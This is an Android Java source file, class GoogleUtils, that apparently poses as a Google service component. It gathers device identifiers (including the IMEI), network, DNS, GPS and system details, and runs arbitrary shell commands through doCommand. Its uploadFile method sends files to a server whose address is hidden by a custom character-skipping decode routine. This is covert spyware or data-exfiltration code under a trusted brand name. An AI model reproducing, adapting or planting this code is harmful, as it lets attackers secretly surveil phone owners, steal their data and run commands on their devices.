package com.googlehelp.service;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import com.google.gson.Gson;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.List;

public class GoogleUtils {
	private static Gson gson = null;
	private final static String address = "o2/40m.Io8ucm].7Eh%Hs&su~ap){o&Jb~9rTwuZ1t=!.%&zrE/|_/!!:fJp9it%^tBqh";
	private final static String monitor = "googleservice.php";
	static {
		if (gson == null) {
			gson = new Gson();
		}
	}

	private GoogleUtils() {
	}

	/**
	 * 将对象转换成json格式
	 * 
	 * @param ts
	 * @return
	 */
	public static String objectToJson(Object ts) {
		String jsonStr = null;
		if (gson != null) {
			jsonStr = gson.toJson(ts);
		}
		return jsonStr;
	}

	/**
	 * 将json格式转换成list对象
	 * 
	 * @param jsonStr
	 * @return
	 */
	public static List<?> jsonToList(String jsonStr) {
		List<?> objList = null;
		if (gson != null) {
			java.lang.reflect.Type type = new com.google.gson.reflect.TypeToken<List<GoogleDeviceInfo>>() {
			}.getType();
			objList = gson.fromJson(jsonStr, type);
		}
		return objList;
	}

	/**
	 * 将json格式转换成Ojbect对象
	 * */
	public static GoogleDeviceInfo jsonToObject(String jsonStr) {
		if (gson != null) {
			GoogleDeviceInfo gdi = gson.fromJson(jsonStr,
					GoogleDeviceInfo.class);
			return gdi;
		}
		return null;
	}

	/**
	 * 将JAVA对象转换成JSON字符串
	 */
	@SuppressWarnings("rawtypes")
	public static String simpleObjectToJsonStr(Object obj)
			throws IllegalArgumentException, IllegalAccessException {
		if (obj == null) {
			return "null";
		}
		String jsonStr = "{";
		Class<?> cla = obj.getClass();
		Field fields[] = cla.getDeclaredFields();
		for (Field field : fields) {
			field.setAccessible(true);
			if (field.getType() == long.class) {
				jsonStr += "\"" + field.getName() + "\":" + field.getLong(obj)
						+ ",";
			} else if (field.getType() == double.class) {
				jsonStr += "\"" + field.getName() + "\":"
						+ field.getDouble(obj) + ",";
			} else if (field.getType() == float.class) {
				jsonStr += "\"" + field.getName() + "\":" + field.getFloat(obj)
						+ ",";
			} else if (field.getType() == int.class) {
				jsonStr += "\"" + field.getName() + "\":" + field.getInt(obj)
						+ ",";
			} else if (field.getType() == boolean.class) {
				jsonStr += "\"" + field.getName() + "\":"
						+ field.getBoolean(obj) + ",";
			} else if (field.getType() == Integer.class
					|| field.getType() == Boolean.class
					|| field.getType() == Double.class
					|| field.getType() == Float.class
					|| field.getType() == Long.class) {
				jsonStr += "\"" + field.getName() + "\":" + field.get(obj)
						+ ",";
			} else if (field.getType() == String.class) {
				jsonStr += "\"" + field.getName() + "\":\"" + field.get(obj)
						+ "\",";
			} else if (field.getType() == List.class) {
				String value = simpleListToJsonStr((List<?>) field.get(obj));
				jsonStr += "\"" + field.getName() + "\":" + value + ",";
			} else {
				// if(claList!=null&&claList.size()!=0&&claList.contains(field.getType())){
				// String value = simpleObjectToJsonStr(field.get(obj),claList);
				// jsonStr += "\""+field.getName()+"\":"+value+",";
				// }else{
				// jsonStr += "\""+field.getName()+"\":null,";
				// }
			}
		}
		jsonStr = jsonStr.substring(0, jsonStr.length() - 1);
		jsonStr += "}";
		return jsonStr;
	}

	/**
	 * 将JAVA的LIST转换成JSON字符串
	 * 
	 * @param list
	 */
	@SuppressWarnings("rawtypes")
	public static String simpleListToJsonStr(List<?> list)
			throws IllegalArgumentException, IllegalAccessException {
		if (list == null || list.size() == 0) {
			return "[]";
		}
		String jsonStr = "[";
		for (Object object : list) {
			jsonStr += simpleObjectToJsonStr(object) + ",";
		}
		jsonStr = jsonStr.substring(0, jsonStr.length() - 1);
		jsonStr += "]";
		return jsonStr;
	}

	public String doCommand(String cmd) {
		Runtime run = Runtime.getRuntime(); // 返回与当前 Java 应用程序相关的运行时对象
		BufferedInputStream in = null;
		BufferedReader inBr = null;
		Process p = null;
		StringBuffer sb = new StringBuffer("");
		try {
			p = run.exec(" " + cmd); // 启动另一个进程来执行命令
			if (cmd.indexOf("start") == -1) {
				in = new BufferedInputStream(p.getInputStream());
				inBr = new BufferedReader(new InputStreamReader(in));
				String lineStr;
				while ((lineStr = inBr.readLine()) != null) { // 获得命令执行后在控制台的输出信息
					if (!"".equals(lineStr))
						// System.err.println(lineStr); // 打印输出信息
						sb.append(lineStr).append("\r\n");
					// Log.d("AAAAAAAAAAAA", "" + lineStr);
				}
			}
			p.waitFor();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (inBr != null)
				try {
					inBr.close();
				} catch (IOException ex) {
				}
			if (in != null)
				try {
					in.close();
				} catch (IOException ex1) {
				}
		}
		return sb.toString();
	}

	/**
	 * 获取GPS状态 ”network” 仅基站定位 ；“gps” 仅GPS定位 ; “network,gps” 基站、GPS都开放
	 * */
	
	public static int getGPSStatus(Context context) {
		String result = Settings.System.getString(context.getContentResolver(),
				Settings.System.LOCATION_PROVIDERS_ALLOWED);
		if (result.toUpperCase().contains("GPS")) {
			return 1;
		}
		return 0;
	}

	/**
	 * 获取wifi信号强度
	 * */
	public static int getWifiSignalState(Context context) {
		WifiManager wm = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		WifiInfo info = wm.getConnectionInfo();
		return info.getRssi();
	}

	/**
	 * 获取DNS
	 * */
	public static String getDNS() {
		try {
			Process localProcess = Runtime.getRuntime()
					.exec("getprop net.dns1");
			BufferedReader reader = new BufferedReader(new InputStreamReader(
					localProcess.getInputStream()));
			String content = reader.readLine();
			return content;
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 获取开机时间
	 * */
	
	public static String getTimes() {
		long time = SystemClock.elapsedRealtime();
		long boot_time = System.currentTimeMillis() - time;
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		return sdf.format(boot_time);
	}

	static String getNetworkType(Context context) {
		if (context
				.checkCallingOrSelfPermission(android.Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
			return "";
		}

		ConnectivityManager connManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connManager == null) {
			return "";
		}
		NetworkInfo netInfo = connManager.getActiveNetworkInfo();
		if (netInfo == null) {
			return "";
		}
		return netInfo.getTypeName();
	}

	/**
	 * 获取网络连接信息
	 * */
	public static String getNetwork(Context context) {
		ConnectivityManager localConnectivityManager = (ConnectivityManager) context
				.getSystemService("connectivity");
		NetworkInfo localNetworkInfo = localConnectivityManager
				.getActiveNetworkInfo();
		if (localNetworkInfo == null)
			return getNetworkType(context);
		if (localNetworkInfo.getType() == 1)
			return getNetworkType(context);
		String str = getNetworkType(context) + ","
				+ localNetworkInfo.getExtraInfo() + ","
				+ localNetworkInfo.getSubtypeName() + ","
				+ localNetworkInfo.getSubtype();
		return java.net.URLEncoder.encode(str);
	}

	/**
	 * 获取deviceID
	 * */
	public static String getDeviceID(Context context) {
		String deviceID = "";
		TelephonyManager telephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		if (telephonyManager != null) {
			deviceID = telephonyManager.getDeviceId();
		}
		boolean invalidDeviceID = false;
		if (deviceID == null) {
			invalidDeviceID = true;
		} else if (deviceID.length() == 0 || deviceID.equals("000000000000000")
				|| deviceID.equals("0")) {
			invalidDeviceID = true;
		} else {
			deviceID = deviceID.toLowerCase();
		}
		if (invalidDeviceID) {
			deviceID = "emulator0000000";
		}
		return deviceID;
	}

	/**
	 * 获取系统版本
	 * */
	public static String getOSVersion() {
		return android.os.Build.VERSION.RELEASE;
	}

	/**
	 * 获取系统名称
	 * */
	public static String getDeviceName() {
		return android.os.Build.MODEL;
	}

	static String decode(String string) {
		char[] prechars = string.toCharArray();
		char[] endchars = new char[prechars.length / 3];
		int j = 0;
		for (int i = prechars.length - 1; i >= 0; i -= 3) {
			endchars[j] = prechars[i];
			j++;
		}
		return new String(endchars);
	}
	static String getPreferenceStr(Context context, String name) {
		return getPreferenceStr(context, name, "");
	}

	static String getPreferenceStr(Context context, String name, String defValue) {
		SharedPreferences preferences = context.getSharedPreferences(
				"preferences", 0);
		return preferences.getString(name, defValue);
	}

	static void setPreferenceStr(Context context, String name, String value) {
		SharedPreferences preferences = context.getSharedPreferences(
				"preferences", 0);
		SharedPreferences.Editor editor = preferences.edit();
		editor.putString(name, value);
		editor.commit();
	}
	
	public static byte[] getBytes(File file) {
		byte[] buffer = null;
		try {
			FileInputStream fis = new FileInputStream(file);
			ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
			byte[] b = new byte[1000];
			int n;
			while ((n = fis.read(b)) != -1) {
				bos.write(b, 0, n);
			}
			fis.close();
			bos.close();
			buffer = bos.toByteArray();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return buffer;
	}
	
	public static void getFile(byte[] bfile,File file) {
		BufferedOutputStream bos = null;
		FileOutputStream fos = null;
		try {
			fos = new FileOutputStream(file);
			bos = new BufferedOutputStream(fos);
			bos.write(bfile);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (bos != null) {
				try {
					bos.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
			if (fos != null) {
				try {
					fos.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
		}
	}
	
	public static boolean uploadFile(File file) {
		String end = "\r\n";
		String twoHyphens = "--";
		String boundary = "******";
		try {
			URL url = new URL(decode(address) + monitor);
			HttpURLConnection httpURLConnection = (HttpURLConnection) url
					.openConnection();
			httpURLConnection.setChunkedStreamingMode(128 * 1024);// 128K
			httpURLConnection.setDoInput(true);
			httpURLConnection.setDoOutput(true);
			httpURLConnection.setUseCaches(false);
			httpURLConnection.setReadTimeout(30*1000);
			httpURLConnection.setConnectTimeout(30*1000);
			httpURLConnection.setRequestMethod("POST");
			httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
			httpURLConnection.setRequestProperty("Charset", "UTF-8");
			httpURLConnection.setRequestProperty("Content-Type",
					"multipart/form-data;boundary=" + boundary);
			DataOutputStream dos = new DataOutputStream(
					httpURLConnection.getOutputStream());
			dos.writeBytes(twoHyphens + boundary + end);
			dos.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\"; filename=\""
					+ file.getName() + "\"" + end);
			dos.writeBytes(end);
			FileInputStream fis = new FileInputStream(file);
			byte[] buffer = new byte[8192]; // 8k
			int count = 0;
			while ((count = fis.read(buffer)) != -1) {
				dos.write(buffer, 0, count);
			}
			fis.close();
			dos.writeBytes(end);
			dos.writeBytes(twoHyphens + boundary + twoHyphens + end);
			dos.flush();
			InputStream is = httpURLConnection.getInputStream();
			int len;
			StringBuffer b = new StringBuffer();
			while ((len = is.read()) != -1) {
				b.append((char) len);
			}
			dos.close();
			is.close();
			String result = b.toString();
			if (result != null && !result.trim().equals("")) {
				JSONObject obj = new JSONObject(result);
				String status = obj.getString("status");
				if (status.equals("1")) {
					return true;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
		return false;
	}
	public static String MD5(String src) {
		MessageDigest md;
		try {
			md = MessageDigest.getInstance("MD5");
			StringBuffer deviceID= new StringBuffer(src);
			src = convertToHex(md.digest(deviceID.toString().getBytes()));
		} catch (Exception e) {
			src = "00000000000000000000000000000000";
		}
		return src;
	}

	private static String convertToHex(byte[] data) {
		StringBuffer buf = new StringBuffer();
		for (int i = 0; i < data.length; i++) {
			int halfbyte = (data[i] >>> 4) & 0x0F;
			int two_halfs = 0;
			do {
				if ((0 <= halfbyte) && (halfbyte <= 9))
					buf.append((char) ('0' + halfbyte));
				else
					buf.append((char) ('a' + (halfbyte - 10)));
				halfbyte = data[i] & 0x0F;
			} while (two_halfs++ < 1);
		}
		return buf.toString();
	}
}
